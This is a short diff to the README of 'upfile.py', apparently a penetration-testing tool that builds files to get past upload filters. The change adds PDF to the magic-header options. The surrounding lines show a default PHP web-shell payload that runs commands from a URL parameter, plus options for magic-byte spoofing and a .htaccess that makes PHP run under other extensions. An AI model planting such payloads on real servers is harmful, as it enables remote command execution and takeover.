@@ -59,7 +59,7 @@ Default file : `PHP`
 Default payload : `<?php system($_GET["cmd"]); ?>`
 
 ```
-usage: upfile.py [-h] [-d] [-p <payload>] [-f {php}] [-ext <ext>] [-b] [-n <name>] [-m {png,jpg}] [-ht <ext>]
+usage: upfile.py [-h] [-d] [-p <payload>] [-f {php}] [-ext <ext>] [-b] [-n <name>] [-m {png,jpg,pdf}] [-ht <ext>]
 
 Generate some payload to bypass restriction when you perform a file upload
 
@@ -75,7 +75,7 @@ options:
   -b, --bypass          Generate some payload to bypass the restriction
   -n <name>, --name <name>
                         Name of the file
-  -m {png,jpg}, --magic {png,jpg}
+  -m {png,jpg,pdf}, --magic {png,jpg,pdf}
                         Magic Header, add the magics numbers before the payload
   -ht <ext>, --htaccess <ext>
                         Creates in addition a .htaccess file, which allow execution of php whith extension that you
